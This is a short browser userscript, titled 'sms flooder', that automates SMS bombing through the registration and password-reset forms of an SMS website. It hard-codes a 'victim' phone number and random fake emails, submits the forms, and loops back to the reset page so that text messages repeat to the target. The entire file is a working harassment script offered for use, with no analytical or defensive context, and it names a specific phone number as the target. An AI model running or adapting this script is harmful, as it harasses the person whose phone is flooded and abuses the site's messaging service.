// ==UserScript==
// @name sms flooder
// @namespace Nandu Apna
// @description phone num
// @include http://smskwik.com/*
// ==/UserScript==

var victim="9963450178"

if(document.location=="http://smskwik.com/ForgetPasswordNew.aspx")
{
document.getElementById('ctl00_ContentPlaceHolder2_Txt_UserName').value=victim;
document.getElementById('ctl00_ContentPlaceHolder2_Btn_Retrive').click();
}

if(document.location=="http://smskwik.com/Registrationnew.aspx")
{
document.getElementById('txt_name').value='hahaqhahha';
document.getElementById('Txt_Email').value=Math.random()+'@gmail.com';
document.getElementById('Txt_Phone_Number').value=victim;
document.getElementById('Txt_Password').value='abcd1234';
document.getElementById('Txt_password_verify').value='abcd1234';
document.getElementById('chkbox').checked = true;
document.getElementById('Btn_Submit').click();
document.location="http://smskwik.com/ForgetPasswordNew.aspx";

}